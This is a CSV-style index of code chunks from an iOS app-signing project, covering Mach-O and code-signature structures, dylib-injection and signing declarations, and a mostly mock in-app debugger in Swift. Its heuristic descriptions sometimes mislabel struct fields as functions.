947,cpp,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","struct mach_header - implements mach_header functionality","struct mach_header
{"
948,cpp,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","struct mach_header_64 - implements mach_header_64 functionality","struct mach_header_64
{"
949,cpp,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","struct load_command - implements load_command functionality","struct load_command
{"
950,cpp,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","struct uuid_command - implements uuid_command functionality","struct uuid_command
{"
951,cpp,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","struct entry_point_command - implements entry_point_command functionality","struct entry_point_command
{"
952,cpp,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","struct codesignature_command - implements codesignature_command functionality","struct codesignature_command
{"
953,cpp,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","struct encryption_info_command - implements encryption_info_command functionality","struct encryption_info_command
{"
954,cpp,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","struct encryption_info_command_64 - implements encryption_info_command_64 functionality","struct encryption_info_command_64
{"
955,cpp,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","struct segment_command - implements segment_command functionality","struct segment_command
{                       /* for 32-bit architectures */"
956,cpp,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","struct segment_command_64 - implements segment_command_64 functionality","struct segment_command_64
{                       /* for 64-bit architectures */"
957,cpp,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","struct section - implements section functionality","struct section
{                       /* for 32-bit architectures */"
958,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","Function alignment - implements alignment functionality","uint32_t align;     /* section alignment (power of 2) */"
959,cpp,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","struct section_64 - implements section_64 functionality","struct section_64
{                       /* for 64-bit architectures */"
960,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","Function alignment - implements alignment functionality","uint32_t align;     /* section alignment (power of 2) */"
961,cpp,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","struct dylib - implements dylib functionality","struct dylib
{"
962,cpp,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","struct dylib_command - implements dylib_command functionality","struct dylib_command
{"
963,cpp,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","struct dylib - implements dylib functionality","struct dylib dylib; /* the library identification */
};

#pragma pack(pop)

//////CodeSignature

enum
{"
964,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","Function pack - implements pack functionality","#pragma pack(pop)

//////CodeSignature

enum
{"
965,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","Function vector - implements vector functionality","CSMAGIC_REQUIREMENTS = 0xfade0c01,              /* Requirements vector (internal requirements) */
CSMAGIC_CODEDIRECTORY = 0xfade0c02,             /* CodeDirectory blob */
CSMAGIC_EMBEDDED_SIGNATURE = 0xfade0cc0,        /* embedded form of signature data */
CSMAGIC_EMBEDDED_SIGNATURE_OLD = 0xfade0b02,    /* XXX */
CSMAGIC_EMBEDDED_ENTITLEMENTS = 0xfade7171,     /* embedded entitlements */
CSMAGIC_EMBEDDED_DER_ENTITLEMENTS = 0xfade7172, /* der format entitlements */
CSMAGIC_DETACHED_SIGNATURE = 0xfade0cc1,        /* multi-arch collection of embedded signatures */
CSMAGIC_BLOBWRAPPER = 0xfade0b01,               /* CMS Signature, among other things */
CS_SUPPORTSSCATTER = 0x20100,
CS_SUPPORTSTEAMID = 0x20200,"
966,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","Function pack - implements pack functionality","#pragma pack(push, 1)

/*
* Structure of an embedded-signature SuperBlob
*/
struct CS_BlobIndex
{"
967,cpp,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","struct CS_BlobIndex - implements functionality related to c s blob index","struct CS_BlobIndex
{"
968,cpp,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","struct CS_SuperBlob - implements functionality related to c s super blob","struct CS_SuperBlob
{"
969,cpp,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","struct CS_CodeDirectory - implements functionality related to c s code directory","struct CS_CodeDirectory
{"
970,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","Function number - implements number functionality","uint32_t magic;         /* magic number (CSMAGIC_CODEDIRECTORY) */"
971,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","Function ordinary - implements ordinary functionality","uint32_t nCodeSlots;    /* number of ordinary (code) hash slots */"
972,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","Function hash - checks if it has h","uint8_t hashType;       /* type of hash (cdHashType* constants) */"
973,cpp,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","struct CS_Entitlement - implements functionality related to c s entitlement","struct CS_Entitlement
{"
974,cpp,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","struct CS_GenericBlob - implements functionality related to c s generic blob","struct CS_GenericBlob
{"
975,cpp,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","struct CS_Scatter - implements functionality related to c s scatter","struct CS_Scatter
{"
976,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","Function pack - implements pack functionality","#pragma pack(pop)
"
977,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Security/openssl_tools.hpp","Function p12_password_check - implements p12 password check functionality","bool p12_password_check(NSString *file, NSString *pass);"
978,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Security/openssl_tools.hpp","Function provision_file_validation - implements provision file validation functionality","void provision_file_validation(NSString *path);"
979,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Security/openssl_tools.hpp","Function generate_root_ca_pair - implements generate root ca pair functionality","void generate_root_ca_pair(const char *basename);"
980,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/zsign.hpp","Function InjectDyLib - implements injectdylib functionality","bool InjectDyLib(NSString *filePath, NSString *dylibPath, bool weakInject, bool bCreate);"
981,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/zsign.hpp","Function ChangeDylibPath - implements changedylibpath functionality","bool ChangeDylibPath(NSString *filePath, NSString *oldPath, NSString *newPath);"
982,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/zsign.hpp","Function ListDylibs - implements listdylibs functionality","bool ListDylibs(NSString *filePath, NSMutableArray *dylibPathsArray);"
983,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/zsign.hpp","Function UninstallDylibs - implements uninstalldylibs functionality","bool UninstallDylibs(NSString *filePath, NSArray<NSString *> *dylibPathsArray);"
984,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/zsign.hpp","Function zsign - implements zsign functionality","int zsign(NSString *app, NSString *prov, NSString *key, NSString *pass, NSString *bundleid, NSString *displayname,
NSString *bundleversion, bool dontGenerateEmbeddedMobileProvision);"
985,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Common/AppContext.swift","/ Represents the current state of the app for AI context","struct AppContext {
let currentScreen: String
let additionalData: [String: Any]

func toString() -> String {"
986,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Common/AppContext.swift","Function toString - implements tostring functionality","func toString() -> String {
var result = ""Current Screen: \(currentScreen)\n""
result += ""App Data:\n""
for (key, value) in additionalData {"
987,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Common/FRSITableViewController.swift","Import the necessary signing data types","class FRSITableViewController: FRSTableViewController {
var signingDataWrapper: SigningDataWrapper
var mainOptions: SigningMainDataWrapper

init(signingDataWrapper: SigningDataWrapper, mainOptions: SigningMainDataWrapper) {"
988,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Common/FRSTableViewController.swift","class FRSTableViewController - Controls user interface and application flow","class FRSTableViewController: UITableViewController {
var tableData: [[String]] = [[]]
var sectionTitles: [String] = []

init() {"
989,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Common/FRSTableViewController.swift","Function viewDidLoad - implements viewdidload functionality","override func viewDidLoad() {
super.viewDidLoad()

// Navigation
configureTitleDisplayMode()

// Delegates
tableView.dataSource = self
tableView.delegate = self
}"
990,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Common/FRSTableViewController.swift","Function configureTitleDisplayMode - implements configuretitledisplaymode functionality","private func configureTitleDisplayMode() {
if isRootViewController() {"
991,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Common/FRSTableViewController.swift","Function isRootViewController - checks if rootviewcontroller","private func isRootViewController() -> Bool {
return navigationController?.viewControllers.first === self
}

func ensureTableDataHasSections() {"
992,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Common/FRSTableViewController.swift","Function ensureTableDataHasSections - implements ensuretabledatahassections functionality","func ensureTableDataHasSections() {
while tableData.count < sectionTitles.count {"
993,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Common/FRSTableViewController.swift","MARK: - Tableview overrides","extension FRSTableViewController {
override func numberOfSections(in _: UITableView) -> Int {"
994,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Common/FRSTableViewController.swift","Function numberOfSections - implements numberofsections functionality","override func numberOfSections(in _: UITableView) -> Int {
return sectionTitles.count
}

override func tableView(_: UITableView, heightForHeaderInSection section: Int) -> CGFloat {"
995,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Common/FRSTableViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, heightForHeaderInSection section: Int) -> CGFloat {
return sectionTitles[section].isEmpty ? 0 : 40
}

override func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {"
996,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Common/FRSTableViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {
return tableData[section].count
}

override func tableView(_: UITableView, viewForHeaderInSection section: Int) -> UIView? {"
997,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Common/FRSTableViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, viewForHeaderInSection section: Int) -> UIView? {
let title = sectionTitles[section]
return InsetGroupedSectionHeader(title: title)
}
}
"
998,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Common/OpenAIResponse.swift","/ Model for AI responses - structure maintained for compatibility","struct OpenAIResponse: Codable {
let choices: [Choice]
let id: String?
let model: String?

struct Choice: Codable {"
999,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Common/OpenAIResponse.swift","struct Choice - implements functionality related to choice","struct Choice: Codable {
let message: Message
let index: Int?
let finish_reason: String?
}

struct Message: Codable {"
1000,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Common/OpenAIResponse.swift","struct Message - implements functionality related to message","struct Message: Codable {
let content: String
let role: String?
}

/// Creates a response with the given content
static func createLocal(content: String) -> Self {"
1001,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Common/OpenAIResponse.swift","/ Creates a response with the given content","static func createLocal(content: String) -> Self {
return Self(
choices: [
Choice(
message: Message(content: content, role: ""assistant""),
index: 0,
finish_reason: ""stop""
),
],
id: UUID().uuidString,"
1002,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/AppDelegate+Debugger.swift","/ Extension to AppDelegate for initializing the debugger","extension AppDelegate {
/// Initialize the debugger
func initializeDebugger() {"
1003,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/AppDelegate+Debugger.swift","/ Initialize the debugger","func initializeDebugger() {
// Initialize the debugger manager
DebuggerManager.shared.initialize()

// Log initialization
Debug.shared.log(message: ""Debugger initialized"", type: .info)
}
}"
1004,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","/ Core engine for the runtime debugger / Provides LLDB-like functionality within the app","public final class DebuggerEngine {
// MARK: - Singleton

/// Shared instance of the debugger engine
public static let shared = DebuggerEngine()

// MARK: - Properties

/// Logger for debugger operations
private let logger = Debug.shared"
1005,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","MARK: - Public Methods / Execute a debugger command / - Parameter command: The command string to execute / - Returns: The result of the command execution","public func executeCommand(_ command: String) -> CommandResult {
// Add to history
addToCommandHistory(command)

// Parse the command
let components = command.trimmingCharacters(in: .whitespacesAndNewlines).components(separatedBy: "" "")
guard let commandType = components.first, !commandType.isEmpty else {"
1006,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","/ Get command history / - Returns: Array of command history strings","public func getCommandHistory() -> [String] {
return commandHistory
}

/// Get all breakpoints
/// - Returns: Array of breakpoints
public func getBreakpoints() -> [Breakpoint] {"
1007,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","/ Get all breakpoints / - Returns: Array of breakpoints","public func getBreakpoints() -> [Breakpoint] {
return breakpoints
}

/// Get all watchpoints
/// - Returns: Array of watchpoints
public func getWatchpoints() -> [Watchpoint] {"
1008,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","/ Get all watchpoints / - Returns: Array of watchpoints","public func getWatchpoints() -> [Watchpoint] {
return watchpoints
}

/// Add a breakpoint
/// - Parameters:
///   - file: File path
///   - line: Line number
///   - condition: Optional condition expression
///   - actions: Optional actions to execute when hit"
1009,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","Function addBreakpoint - implements addbreakpoint functionality","public func addBreakpoint(file: String, line: Int, condition: String? = nil,
actions: [BreakpointAction] = []) -> Breakpoint
{"
1010,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","Function removeBreakpoint - implements removebreakpoint functionality","public func removeBreakpoint(id: String) -> Bool {
guard let index = breakpoints.firstIndex(where: { $0.id == id }) else {"
1011,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","Function addWatchpoint - implements addwatchpoint functionality","public func addWatchpoint(address: UnsafeRawPointer, size: Int, condition: String? = nil) -> Watchpoint {
let watchpoint = Watchpoint(id: UUID().uuidString, address: address, size: size, condition: condition)
watchpoints.append(watchpoint)

logger.log(message: ""Added watchpoint at address \(address)"", type: .debug)
notificationCenter.post(name: .debuggerWatchpointAdded, object: watchpoint)

return watchpoint
}
"
1012,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","Function removeWatchpoint - implements removewatchpoint functionality","public func removeWatchpoint(id: String) -> Bool {
guard let index = watchpoints.firstIndex(where: { $0.id == id }) else {"
1013,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","/ Pause execution","public func pause() {
executionState = .paused
notificationCenter.post(name: .debuggerExecutionPaused, object: nil)
logger.log(message: ""Execution paused"", type: .debug)
}

/// Continue execution
public func resume() {"
1014,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","/ Continue execution","public func resume() {
executionState = .running
notificationCenter.post(name: .debuggerExecutionResumed, object: nil)
logger.log(message: ""Execution resumed"", type: .debug)
}

/// Step over current line
public func stepOver() {"
1015,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","/ Step over current line","public func stepOver() {
// In a real implementation, this would use debugging APIs to step over
logger.log(message: ""Step over"", type: .debug)
notificationCenter.post(name: .debuggerStepCompleted, object: StepType.over)
}

/// Step into function
public func stepInto() {"
1016,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","/ Step into function","public func stepInto() {
// In a real implementation, this would use debugging APIs to step into
logger.log(message: ""Step into"", type: .debug)
notificationCenter.post(name: .debuggerStepCompleted, object: StepType.into)
}

/// Step out of current function
public func stepOut() {"
1017,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","/ Step out of current function","public func stepOut() {
// In a real implementation, this would use debugging APIs to step out
logger.log(message: ""Step out"", type: .debug)
notificationCenter.post(name: .debuggerStepCompleted, object: StepType.out)
}

/// Get the current backtrace
/// - Returns: Array of stack frame information
public func getBacktrace() -> [StackFrame] {"
1018,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","/ Get the current backtrace / - Returns: Array of stack frame information","public func getBacktrace() -> [StackFrame] {
// In a real implementation, this would use debugging APIs to get the backtrace
var frames: [StackFrame] = []

// Get the call stack using Thread.callStackSymbols
let callStackSymbols = Thread.callStackSymbols

for (index, symbol) in callStackSymbols.enumerated() {"
1019,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","/ Get variables in the current scope / - Returns: Dictionary of variable names and values","public func getVariables() -> [Variable] {
// In a real implementation, this would use debugging APIs to get variables
// For now, return some example variables
return [
Variable(
name: ""self"",
type: ""DebuggerEngine"",
value: ""DebuggerEngine"",
summary: ""DebuggerEngine instance""
),"
1020,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","/ Evaluate an expression in the current context / - Parameter expression: The expression to evaluate / - Returns: Result of the evaluation","public func evaluateExpression(_ expression: String) -> ExpressionResult {
// In a real implementation, this would use debugging APIs to evaluate expressions
logger.log(message: ""Evaluating expression: \(expression)"", type: .debug)

// For demonstration, return a mock result
return ExpressionResult(
success: true,
value: ""Mock result for: \(expression)"",
type: ""String"",
hasChildren: false"
1021,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","MARK: - Private Methods","private func setupExceptionHandling() {
// Set up exception handling with a closure that calls our static method
NSSetUncaughtExceptionHandler({ exception in"
1022,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","Static exception handler that doesn't capture self","private static func handleUncaughtException(_ exception: NSException) {
shared.handleException(exception)
}

private func handleException(_ exception: NSException) {"
1023,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","Function handleException - implements handleexception functionality","private func handleException(_ exception: NSException) {
let name = exception.name.rawValue
let reason = exception.reason ?? ""Unknown reason""
let userInfo = exception.userInfo ?? [:]
let callStack = exception.callStackSymbols

let exceptionInfo = ExceptionInfo(
name: name,
reason: reason,
userInfo: userInfo,"
1024,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","Function addToCommandHistory - implements addtocommandhistory functionality","private func addToCommandHistory(_ command: String) {
// Don't add empty commands or duplicates of the last command
if command.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty ||
(commandHistory.first == command)
{"
1025,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","MARK: - Command Handlers","private func handleHelpCommand(_ components: [String]) -> CommandResult {
let helpText = """"""
Available commands:

help                    - Show this help
po, print <expr>        - Print object description
bt, backtrace           - Show backtrace
br, breakpoint <subcmd> - Breakpoint commands
watch <addr> <size>     - Set watchpoint
expr <expr>             - Evaluate expression"
1026,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","Function handlePrintCommand - implements handleprintcommand functionality","private func handlePrintCommand(_ components: [String]) -> CommandResult {
guard components.count > 1 else {"
1027,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","Function handleBacktraceCommand - implements handlebacktracecommand functionality","private func handleBacktraceCommand() -> CommandResult {
let frames = getBacktrace()

var output = ""Backtrace:\n""
for frame in frames {"
1028,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","Function handleBreakpointCommand - implements handlebreakpointcommand functionality","private func handleBreakpointCommand(_ components: [String]) -> CommandResult {
guard components.count > 1 else {"
1029,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","Function handleWatchpointCommand - implements handlewatchpointcommand functionality","private func handleWatchpointCommand(_: [String]) -> CommandResult {
// Implementation would use real memory watching APIs
return CommandResult(success: false, output: ""Watchpoint functionality not fully implemented"")
}

private func handleExpressionCommand(_ components: [String]) -> CommandResult {"
1030,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","Function handleExpressionCommand - implements handleexpressioncommand functionality","private func handleExpressionCommand(_ components: [String]) -> CommandResult {
guard components.count > 1 else {"
1031,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","Function handleThreadCommand - implements handlethreadcommand functionality","private func handleThreadCommand(_: [String]) -> CommandResult {
// Implementation would use real thread debugging APIs
return CommandResult(success: false, output: ""Thread command not fully implemented"")
}

private func handleMemoryCommand(_: [String]) -> CommandResult {"
1032,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","Function handleMemoryCommand - implements handlememorycommand functionality","private func handleMemoryCommand(_: [String]) -> CommandResult {
// Implementation would use real memory inspection APIs
return CommandResult(success: false, output: ""Memory command not fully implemented"")
}

private func handleStepCommand(_ components: [String]) -> CommandResult {"
1033,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","Function handleStepCommand - implements handlestepcommand functionality","private func handleStepCommand(_ components: [String]) -> CommandResult {
guard components.count > 1 else {"
1034,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","Function handleContinueCommand - implements handlecontinuecommand functionality","private func handleContinueCommand() -> CommandResult {
resume()
return CommandResult(success: true, output: ""Continuing execution"")
}

private func handlePauseCommand() -> CommandResult {"
1035,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","Function handlePauseCommand - implements handlepausecommand functionality","private func handlePauseCommand() -> CommandResult {
pause()
return CommandResult(success: true, output: ""Execution paused"")
}

private func handleFrameCommand(_: [String]) -> CommandResult {"
1036,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","Function handleFrameCommand - implements handleframecommand functionality","private func handleFrameCommand(_: [String]) -> CommandResult {
// Implementation would use real frame selection APIs
return CommandResult(success: false, output: ""Frame command not fully implemented"")
}

private func handleVariableCommand(_: [String]) -> CommandResult {"
1037,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","Function handleVariableCommand - implements handlevariablecommand functionality","private func handleVariableCommand(_: [String]) -> CommandResult {
let variables = getVariables()

var output = ""Variables:\n""
for variable in variables {"
1038,swift,iOS,protocol,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","MARK: - Supporting Types / Delegate protocol for debugger engine events","public protocol DebuggerEngineDelegate: AnyObject {
/// Called when a breakpoint is hit
func debuggerEngine(_ engine: DebuggerEngine, didHitBreakpoint breakpoint: Breakpoint)

/// Called when a watchpoint is triggered
func debuggerEngine(
_ engine: DebuggerEngine,
didTriggerWatchpoint watchpoint: Watchpoint,
oldValue: Any?,
newValue: Any?"
1039,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","/ Called when a breakpoint is hit","func debuggerEngine(_ engine: DebuggerEngine, didHitBreakpoint breakpoint: Breakpoint)

/// Called when a watchpoint is triggered
func debuggerEngine(
_ engine: DebuggerEngine,
didTriggerWatchpoint watchpoint: Watchpoint,
oldValue: Any?,
newValue: Any?
)

/// Called when an exception is caught
func debuggerEngine(_ engine: DebuggerEngine, didCatchException exception: ExceptionInfo)

/// Called when execution state changes
func debuggerEngine(_ engine: DebuggerEngine, didChangeExecutionState state: ExecutionState)
}

/// Default implementation for optional methods
public extension DebuggerEngineDelegate {"
1040,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","/ Called when a watchpoint is triggered","func debuggerEngine(
_ engine: DebuggerEngine,
didTriggerWatchpoint watchpoint: Watchpoint,
oldValue: Any?,
newValue: Any?
)

/// Called when an exception is caught
func debuggerEngine(_ engine: DebuggerEngine, didCatchException exception: ExceptionInfo)

/// Called when execution state changes
func debuggerEngine(_ engine: DebuggerEngine, didChangeExecutionState state: ExecutionState)
}

/// Default implementation for optional methods
public extension DebuggerEngineDelegate {"
1041,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","/ Called when an exception is caught","func debuggerEngine(_ engine: DebuggerEngine, didCatchException exception: ExceptionInfo)

/// Called when execution state changes
func debuggerEngine(_ engine: DebuggerEngine, didChangeExecutionState state: ExecutionState)
}

/// Default implementation for optional methods
public extension DebuggerEngineDelegate {"
1042,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","/ Called when execution state changes","func debuggerEngine(_ engine: DebuggerEngine, didChangeExecutionState state: ExecutionState)
}

/// Default implementation for optional methods
public extension DebuggerEngineDelegate {"
1043,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","/ Default implementation for optional methods","public extension DebuggerEngineDelegate {
func debuggerEngine(_: DebuggerEngine, didHitBreakpoint _: Breakpoint) {}"
1044,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","Function debuggerEngine - implements debuggerengine functionality","func debuggerEngine(_: DebuggerEngine, didHitBreakpoint _: Breakpoint) {}
func debuggerEngine(_: DebuggerEngine, didTriggerWatchpoint _: Watchpoint, oldValue _: Any?,
newValue _: Any?) {}"
1045,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","Function debuggerEngine - implements debuggerengine functionality","func debuggerEngine(_: DebuggerEngine, didTriggerWatchpoint _: Watchpoint, oldValue _: Any?,
newValue _: Any?) {}"
1046,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","Function debuggerEngine - implements debuggerengine functionality","func debuggerEngine(_: DebuggerEngine, didCatchException _: ExceptionInfo) {}
func debuggerEngine(_: DebuggerEngine, didChangeExecutionState _: ExecutionState) {}"
1047,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","Function debuggerEngine - implements debuggerengine functionality","func debuggerEngine(_: DebuggerEngine, didChangeExecutionState _: ExecutionState) {}
}

/// Execution state of the debugger
public enum ExecutionState {"
1048,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","/ Execution state of the debugger","public enum ExecutionState {
case running
case paused
case stepping
}

/// Thread state
public struct ThreadState {"
1049,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","/ Thread state","public struct ThreadState {
let id: String
let name: String
let state: String
let priority: Double
let frames: [StackFrame]
}

/// Stack frame information
public struct StackFrame {"
